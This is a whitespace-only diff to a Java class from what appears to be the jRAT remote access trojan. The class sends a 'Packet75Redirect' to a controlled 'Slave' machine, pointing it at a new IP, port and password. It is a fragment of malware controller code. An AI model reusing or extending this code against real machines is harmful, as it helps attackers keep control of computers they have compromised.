@@ -7,7 +7,6 @@ import pro.jrat.packets.outgoing.Packet75Redirect;
 import pro.jrat.utils.IconUtils;
 import pro.jrat.utils.Utils;
 
-
 public class RedirectEvent extends Event {
 
 	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
@@ -24,7 +23,7 @@ public class RedirectEvent extends Event {
 	}
 
 	@Override
-	public void perform(Slave sl) {	
+	public void perform(Slave sl) {
 		String[] str = ip.split(":");
 		sl.addToSendQueue(new Packet75Redirect(str[0], Integer.parseInt(str[1]), pass));
 	}
